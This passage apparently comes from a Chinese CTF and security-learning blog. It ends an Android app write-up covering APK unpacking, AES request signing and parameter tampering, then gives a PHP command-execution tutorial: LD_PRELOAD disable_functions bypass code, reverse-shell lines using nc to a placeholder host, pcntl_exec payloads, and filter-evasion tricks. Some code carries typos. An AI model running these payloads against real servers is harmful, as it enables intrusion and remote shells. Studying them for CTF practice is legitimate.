+<p>于是访问<a target="_blank" rel="noopener" href="http://210.30.97.133:10181/api/cors/http/scr1wgpt-web/generator%E5%8D%B3%E5%8F%AF%E6%8B%BF%E5%88%B0%E7%9C%9F%E6%AD%A3%E7%9A%84flag">http://210.30.97.133:10181/api/cors/http/scr1wgpt-web/generator即可拿到真正的flag</a></p>
+<h3 id="5-app"><a href="#5-app" class="headerlink" title="5.app"></a>5.app</h3><p><img src="/../images/sssctf/app-1.png"></p>
+<p>360加固，用frida-dexdump脱壳</p>
+<p>前台模拟器挂着app，开启adb中的frida</p>
+<p><img src="/../images/sssctf/7.png" alt="!(../images/sssctf/6.png)"></p>
+<p><img src="/../images/sssctf/8.png"></p>
+<p>生成了一个文件夹，把里面的dex文件拖入jadx</p>
+<p><img src="/../images/sssctf/9.png"></p>
+<p>再用fiddler抓包,抓到config的包</p>
+<p><img src="/../images/sssctf/10.png"></p>
+<p>{“key”:”khcYuxRprjYyRVY71OK6RLSi2jn2ljd7vkm+VqDAgRk&#x3D;”,”iv”:”bhT3FXFaimOl80uvAk92+A&#x3D;&#x3D;”}</p>
+<p><img src="/../images/sssctf/11.png"></p>
+<p>点击个人信息抓到这个包，直接访问<a target="_blank" rel="noopener" href="http://210.30.97.133:10055/service/m/app/info?uid=-1">http://210.30.97.133:10055/service/m/app/info?uid=-1</a></p>
+<p><img src="/../images/sssctf/12.png"></p>
+<p>得知访问数据是要签名的，签名需要config里的key和iv，用java签名的AES加密，发包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;khcYuxRprjYyRVY71OK6RLSi2jn2ljd7vkm+VqDAgRk=&quot;</span>; <span class="comment">// 替换为你的key</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">iv</span> <span class="operator">=</span> <span class="string">&quot;bhT3FXFaimOl80uvAk92+A==&quot;</span>; <span class="comment">// 替换为你的iv</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;uid=20&amp;timestamp=1&amp;a=2&amp;nonce=3&quot;</span>; <span class="comment">// 替换为你的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(Base64.getDecoder().decode(key), <span class="string">&quot;AES&quot;</span>), <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(Base64.getDecoder().decode(iv)));</span><br><span class="line">        <span class="type">byte</span>[] encrypted = cipher.doFinal(data.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] digest = md.digest(encrypted);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : digest) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sign</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        System.out.println(<span class="string">&quot;Generated sign: &quot;</span> + sign);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sssctf/14.png"></p>
+<p>做到这里发现uid是无法直接访问其他数据的，看了wp上通过逆向分析可以发现rank路由</p>
+<p><img src="/../images/sssctf/15.png"></p>
+<p>拿到数据，发现最后一条数据<code>&#123;&quot;id&quot;:6660,&quot;institute&quot;:&quot;DUTCTF&quot;,&quot;name&quot;:&quot;福来阁&quot;,&quot;points&quot;:40&#125;</code></p>
+<p>这里可以猜测是visitor的问题，根据逆向的代码(这里直接贴wp的图片了，自己太菜审计不出来)，得知有个isVisitor参数</p>
+<p><img src="/../images/sssctf/16.png"></p>
+<p>构造url访问，记得这里的签名也要加上isVisitor</p>
+<p><img src="/../images/sssctf/17.png"></p>
+<p>千辛万苦终于拿到flag了</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/article/862536289/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/article/1615743781/">
+        <h2 class="post-title">php命令执行</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/4/17
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h1><h2 id="一-命令执行函数介绍"><a href="#一-命令执行函数介绍" class="headerlink" title="一.命令执行函数介绍"></a>一.命令执行函数介绍</h2><p><code>system exec passthru shell_exec 反引号 popen proc_open pcntl_exec</code></p>
+<p>了解能否<strong>回显</strong>，需求的<strong>参数</strong></p>
+<h3 id="system-string-command-int-return-var"><a href="#system-string-command-int-return-var" class="headerlink" title="system(string $command,int &amp;$return_var&#x3D;?)"></a>system(string $command,int &amp;$return_var&#x3D;?)</h3><p>command为执行的命令(必须)，return_var用来记录命令执行后返回的状态(可选)</p>
+<p><strong>system函数有回显</strong></p>
+<h3 id="exec-string-command-array-output-int-return-var"><a href="#exec-string-command-array-output-int-return-var" class="headerlink" title="exec(string $command,array &amp;$output&#x3D;?,int  &amp;$return_var&#x3D;?)"></a>exec(string $command,array &amp;$output&#x3D;?,int  &amp;$return_var&#x3D;?)</h3><p>command为执行的命令，单独使用时只有最后一行结果，且不会回显</p>
+<p>output:用命令执行的输出填充此数组，每行输出一个元素，用<strong>print_r(array)或var_dump</strong>输出结果</p>
+<p>var返回状态（忽略）</p>
+<h3 id="passthru-string-command-int-return-var"><a href="#passthru-string-command-int-return-var" class="headerlink" title="passthru(string $command,int &amp;$return_var)"></a>passthru(string $command,int &amp;$return_var)</h3><p>command:执行的命令，var忽略</p>
+<p>二进制数据（无关）</p>
+<p><strong>直接回显，不需要print_r</strong></p>
+<p>shell_exec(string $cmd)</p>
+<p><strong>无回显，需要print_r，echo..</strong></p>
+<h3 id="反引号-cmd"><a href="#反引号-cmd" class="headerlink" title="反引号`$cmd`"></a>反引号`$cmd`</h3><p><strong>无回显</strong></p>
+<h3 id="popen-string-command-string-mode"><a href="#popen-string-command-string-mode" class="headerlink" title="popen(string $command,string $mode)"></a>popen(string $command,string $mode)</h3><p>mode(模式):’r’表示阅读,’w’表示写入。（命令执行后会把内容放到一个临时文档）</p>
+<p>这个文档需要用fgets获取内容,用print_r输出内容</p>
+<p><strong>‘w’模式支持自动回显，r模式需要用print_r</strong></p>
+<h3 id="proc-open-1-2-3-4-5-6-不常用"><a href="#proc-open-1-2-3-4-5-6-不常用" class="headerlink" title="proc_open(1,2,3,4,5,6)	&#x2F;&#x2F;不常用"></a>proc_open(1,2,3,4,5,6)	&#x2F;&#x2F;不常用</h3><p>1,2,3必须</p>
+<p>1:command;	2:descriptor_spec 定义数组内容	3:pipes:调用数组内容</p>
+<p>descriptor_spec需要预定义，$pipes[1]写入，stream_get_contents($pipes[1]);读取，需要echo</p>
+<h3 id="pcntl-exec-1-2-3-后续讲解"><a href="#pcntl-exec-1-2-3-后续讲解" class="headerlink" title="pcntl_exec(1,2,3)	&#x2F;&#x2F;后续讲解"></a>pcntl_exec(1,2,3)	&#x2F;&#x2F;后续讲解</h3><p>此模块需额外安装</p>
+<p>1:string $path为一个可执行二进制文件，在linux中<code>/bin/命令</code> 为二进制执行</p>
+<p>2：array $args是传递给程序的参数</p>
+<p>3:$envs是字符串数组，key&#x3D;&gt;value格式,key代表要传递的环境变量的名称，value代表环境变量的值</p>
+<h2 id="二、替换绕过函数过滤"><a href="#二、替换绕过函数过滤" class="headerlink" title="二、替换绕过函数过滤"></a>二、替换绕过函数过滤</h2><p>过滤exec|system|popen|proc_open|`</p>
+<p>用其他函数,如passthru(‘cmd’)绕过</p>
+<h2 id="三、LD-PRELOAD绕过原理"><a href="#三、LD-PRELOAD绕过原理" class="headerlink" title="三、LD_PRELOAD绕过原理"></a>三、LD_PRELOAD绕过原理</h2><h4 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1.应用场景"></a>1.应用场景</h4><p>disable_functions禁用所有可能用到的命令执行函数</p>
+<h4 id="2-程序的链接"><a href="#2-程序的链接" class="headerlink" title="2.程序的链接"></a>2.程序的链接</h4><p>(1)静态链接:在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>(2)装入时动态链接:源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。<br>(3)运行时动态链接:原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。<br>    对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新。</p>
+<h4 id="3-LD-PRELOAD"><a href="#3-LD-PRELOAD" class="headerlink" title="3.LD_PRELOAD"></a>3.LD_PRELOAD</h4><p>修改库文件</p>
+<p>影响程序运行时的链接，加载别的动态链接可以，甚至覆盖正常的库</p>
+<p>使用自己的或是更好的函数（无需别人的源码），也可以向别人的程序注入恶意程序</p>
+<p>使用方法：</p>
+<ol>
+<li>mail 内嵌在php里</li>
+<li>imagick需要扩展安装</li>
+</ol>
+<h5 id="1-mail"><a href="#1-mail" class="headerlink" title="1.mail"></a>1.mail</h5><p><code>vim demo.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>strace -o 1.txt -f php demo.php</code>把输出写到1.txt文件</p>
+<p><code>cat 1.txt | grep execve</code>检查调用了那些子程序，调用了sendmail函数</p>
+<p><code>readelf -Ws /usr/sbin/sendmail</code>查看调用了哪些库文件，其中geteuid库文件(获取用户uid信息)可以替换自己写的库文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;echo&#x27;小可爱，你邮件还能发出去么?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;<span class="comment">//生成动作geteuid,执行payload</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD PRELOAD&quot;</span>);<span class="comment">//生成动作geteuid,执行payload结束调用</span></span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
+<p>在此之前，需要修改demo,php更改库文件(esc wq保存)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时调用<code>php demo.php</code>输出小可爱，你邮件还能发出去么?</p>
+<p>原理mail-&gt;sendmail()-&gt;geteuid()</p>
+<p>绕过条件：</p>
+<p>1.能够上传自己的.so文件;</p>
+<p>2.能够控制环境变量的值(设置LD_PRELOAD变量)，比如putenv函数并且未被禁止;</p>
+<p>3.存在可以控制PHP启动外部程序的函数并能执行(因为新进程启动将加载LDPRELOAD<br>中的.so文件)，比如mail()、imap mail()、mb_send_mail()和error_log()等。</p>
+<h4 id="4-例题-81端口禁用函数例题"><a href="#4-例题-81端口禁用函数例题" class="headerlink" title="4.例题-81端口禁用函数例题"></a>4.例题-81端口禁用函数例题</h4><p>ld-prlooad防炸<br><code>dpkg-reconfigure dash</code>      yes</p>
+<p><code>dpkg-reconfigure bash</code>       做完了改回来</p>
+<h5 id="1-上传-so和-php"><a href="#1-上传-so和-php" class="headerlink" title="1.上传.so和.php"></a>1.上传.so和.php</h5><p>使用蚁剑链接可以上传下载文件（不能直接查看根目录）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;cat /flag &gt; /tmp/flag&quot;</span>);<span class="comment">//故去flag输出到/tmp/flag(可查看的目录就行)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;<span class="comment">//生成动作geteuid,执行payload</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD PRELOAD&quot;</span>);<span class="comment">//生成动作geteuid,执行payload结束调用</span></span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
+<p>从&#x2F;root&#x2F;php找到demo.so，拷贝到windows</p>
+<p>再编辑demo.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一起上传到蚁剑,网页访问&#x2F;demo.php，在tmp目录找到flag</p>
+<p>*为了避免重复上传文件，更改c文件的system为<code>system(&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;)</code>反弹shell</p>
+<p><code>nc -lvp 7777</code>监听7777端口</p>
+<p>上传.so .php文件，访问demo.php，此时直接在linux终端输入命令即可</p>
+<h5 id="EVIL-CMDLINE-不如nc"><a href="#EVIL-CMDLINE-不如nc" class="headerlink" title="EVIL_CMDLINE(不如nc)"></a>EVIL_CMDLINE(不如nc)</h5><p>把要执行的命令赋值到环境变量EVIL_CMDLINE直接读取命令</p>
+<p>demo.c-&gt;.so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL CMDLINE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&quot;LD PRELOAD&quot;</span>)== <span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenV(<span class="string">&quot;LD PRELOAD&quot;</span>);</span><br><span class="line">system(cmdline);<span class="comment">//放入system执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>demo.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> =<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];<span class="comment">//要执行的命令</span></span><br><span class="line"><span class="variable">$out_path</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;outpath&quot;</span>];<span class="comment">//outpath命令执行结果输出到指定路径下的文件</span></span><br><span class="line"><span class="variable">$qvil_cmdline</span> = <span class="variable">$cmd</span>.<span class="string">&quot;&gt;&quot;</span>.<span class="variable">$out</span> path.<span class="string">&quot; 2&gt;&amp;1&quot;</span><span class="comment">//2&gt;&amp;1将标准错误重定向到标准输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;cmdline: &lt;/b&gt;&quot;</span>.<span class="variable">$evil</span> cmdline;<span class="comment">//打印显示实际在linux上执行的命令</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL CMDLINE=&quot;</span>.<span class="variable">$evil</span> cmdline);<span class="comment">//putenv改变环境变量的值</span></span><br><span class="line"><span class="variable">$so_path</span> =$ _REQUEST[<span class="string">&quot;sopath&quot;</span>];<span class="comment">//定义动态链接库</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD PRELOAD=&quot;</span>.<span class="variable">$so_path</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;output: &lt;/b&gt;&lt;br /&gt;&quot;</span>.<span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>));<span class="comment">//调用输出环境变量的命令</span></span><br></pre></td></tr></table></figure>
+
+<p>上传.so,.php</p>
+<p>访问url&#x2F;demo.php?cmd&#x3D;ls&amp;outpath&#x3D;&#x2F;tmp&#x2F;benben&amp;sopath&#x3D;.&#x2F;demo.so</p>
+<h2 id="四、蚁剑及pcntl绕过函数过滤"><a href="#四、蚁剑及pcntl绕过函数过滤" class="headerlink" title="四、蚁剑及pcntl绕过函数过滤"></a>四、蚁剑及pcntl绕过函数过滤</h2><h3 id="1-蚁剑"><a href="#1-蚁剑" class="headerlink" title="1.蚁剑"></a>1.蚁剑</h3><p><img src="/../images/0421-1.png"></p>
+<p>利用蚁剑的插件绕过</p>
+<p><img src="/../images/0421/0421-3.png"></p>
+<p><img src="/../images/0421/0421-4.png"></p>
+<p>蚁剑链接.antproxy.php文件，即可成功执行命令，在虚拟终端中利用<code>tac /flag</code>即可读取</p>
+<p><strong>PHP7 GC with Certain Destructors UAF</strong>直接打开虚拟终端</p>
+<h3 id="2-pcntl-exec"><a href="#2-pcntl-exec" class="headerlink" title="2.pcntl_exec"></a>2.pcntl_exec</h3><p>需要单独安装</p>
+<p>pcntl_exec(1,2,3)</p>
+<ol>
+<li>string $path :必须是可执行二进制文件路径或一个在文件第一行制定了一个可执行文件路径标头的脚本(例如#!&#x2F;lusr&#x2F;local&#x2F;bin&#x2F;perl)</li>
+<li>array $args:传递给程序的单数的字符串数组，用于执行命令</li>
+<li>envs:环境变量，忽略</li>
+</ol>
+<p>例如*#&#x2F;bin&#x2F;bash* -c &#x2F;bin&#x2F;ls 前面是path 后面是args	-c为执行此二进制文件</p>
+<p>前提：info信息中没有禁用pcntl_exec函数</p>
+<p>pcntl_exec函数没有回显</p>
+<ol>
+<li>cat文件并输出到有权限读取的路径</li>
+<li>shell反弹</li>
+</ol>
+<p>payload:<code>cmd=pcntl_exec(&quot;/bin/bash&quot;,array(&quot;-c&quot;,&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;));</code>注意是post还是get</p>
+<p><code>nc -lvp 7777</code>监听端口即可</p>
+<h2 id="五、操作系统连接符"><a href="#五、操作系统连接符" class="headerlink" title="五、操作系统连接符"></a>五、操作系统连接符</h2><p>拼接命令</p>
+<h3 id="1-分号-；"><a href="#1-分号-；" class="headerlink" title="1.分号   ；"></a>1.分号   ；</h3><p>可以使命令都执行,类似sql堆叠注入</p>
+<p>用法:可以提前闭合命令，或加上其他东西报错</p>
+<p><code>-666;cat /flag;</code> 需要在页面源代码查看（tac指令可以直接显示）</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2.&amp;"></a>2.&amp;</h3><p><strong>必须url编码%26</strong></p>
+<p>与；效果接近 ，同时执行多条命令</p>
+<h3 id="3-与"><a href="#3-与" class="headerlink" title="3. &amp;&amp;	与"></a>3. &amp;&amp;	与</h3><p>如果前面命令执行成功，则执行后面命令，记得编码</p>
+<p>?cmd&#x3D;%26%26pwd%26%26tac &#x2F;flag</p>
+<h3 id="4-管道输出符"><a href="#4-管道输出符" class="headerlink" title="4.|	管道输出符"></a>4.|	管道输出符</h3><p>把前面的命令输出座位后面命令的输入，都会执行，但只显示后面执行的结果</p>
+<p><code>echo &quot;ls -l&quot; | /bin/bash</code></p>
+<h3 id="5-或"><a href="#5-或" class="headerlink" title="5.||	或"></a>5.||	或</h3><p>前面执行成功则后面的不执行，前面的失败后面的执行</p>
+<p>应用:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span>=$ GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>;<span class="comment">//八所偶遇输出全部扔进垃圾桶</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过方法:</p>
+<p><code>cmd=ls||</code>忽略掉后边的指令</p>
+<h2 id="六、空格过滤绕过"><a href="#六、空格过滤绕过" class="headerlink" title="六、空格过滤绕过"></a>六、空格过滤绕过</h2><p><code>$cmd= preg replace(&quot;# #&quot;,&quot;&quot;,$cmd);</code>正则替换</p>
+<p>例如:ls -l查看文件详细信息将失效</p>
+<p>绕过方法:</p>
+<p>1.大括号{cat,flag.txt}</p>
+<p>2.$IFS，${IFS}，$IFS$9 (内敛字段分隔符)     	在Linux系统中用加大括号界定</p>
+<p>3.重定向字符&lt;,&lt;&gt;;</p>
+<p>“&lt;”是输出重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备</p>
+<p>cat&lt;flag.php;	cat&lt;&gt;flag.php(&gt;会创建文件)</p>
+<p>4.url编码%09-&gt;Tab %20-&gt;[空格]</p>
+<h2 id="七、文件名过滤绕过"><a href="#七、文件名过滤绕过" class="headerlink" title="七、文件名过滤绕过"></a>七、文件名过滤绕过</h2><p><code>!preg_match(&quot;/flag|system|php/i&quot;,$cmd)</code></p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="1-通配符-绕过"><a href="#1-通配符-绕过" class="headerlink" title="1.通配符? *绕过"></a>1.通配符? *绕过</h4><p>cat fl?g.php</p>
+<p>?在Linux可以替代字母，可以替代很多字母 ????.???</p>
+<p>*可以进行模糊匹配,代表任何字符串 cat f*</p>
+<h4 id="2-单引号，双引号绕过"><a href="#2-单引号，双引号绕过" class="headerlink" title="2.单引号，双引号绕过"></a>2.单引号，双引号绕过</h4><p>‘’，””空字符	插入空字符</p>
+<p>fl””ag fl&#39;&#39;ag</p>
+<h4 id="3-反斜杠"><a href="#3-反斜杠" class="headerlink" title="3.反斜杠"></a>3.反斜杠</h4><p>反斜杠是换行的标志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f/lag==</span><br><span class="line">f</span><br><span class="line">lag</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-特殊变量"><a href="#4-特殊变量" class="headerlink" title="4.特殊变量"></a>4.特殊变量</h4><p>$1,$9,$@,$*无意义的字符</p>
+<h4 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h4><p><code>a=f;d=ag;c=l;cat \$a\$c\$b.txt</code></p>
+<h4 id="6-利用Linux中的环境变量"><a href="#6-利用Linux中的环境变量" class="headerlink" title="6.利用Linux中的环境变量"></a>6.利用Linux中的环境变量</h4><p>试用环境变量里的字符执行变量</p>
+<p><code>echo $PATH</code>会输出环境变量</p>
+<p><code>$&#123;PATH：5:1&#125;</code>代表从第5个字符起取出1个字符</p>
+<p><code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></p>
+<p>&#x2F;也是字符,从0开始数</p>
+<p><code>#echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;g.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></p>
+<h2 id="八、常见文件读取命令绕过"><a href="#八、常见文件读取命令绕过" class="headerlink" title="八、常见文件读取命令绕过"></a>八、常见文件读取命令绕过</h2><p><code>(!preg_match(&quot;/flag|php|cat|sort|shell\&#39;/i&quot;,$cmd)</code></p>
+<p>绕过方法:</p>
+<ol>
+<li>tac:反向显示<br>自下而上</li>
+<li>more:一页一页的显示档案内容 查看源代码</li>
+<li>less:效果和more类似</li>
+<li>tail:查看末尾几行（最后十行）</li>
+<li>nl:显示的时候显示行号，查看源代码</li>
+<li>od：以二进制方式读取文件内容<br><code>cmd=passthru(&quot;od -A d -c fla\g/ph\p&quot;)</code>可以把ascii码转换成字符,一行32字节</li>
+<li>xxd:读取二进制文档<br>左边二进制右边字符</li>
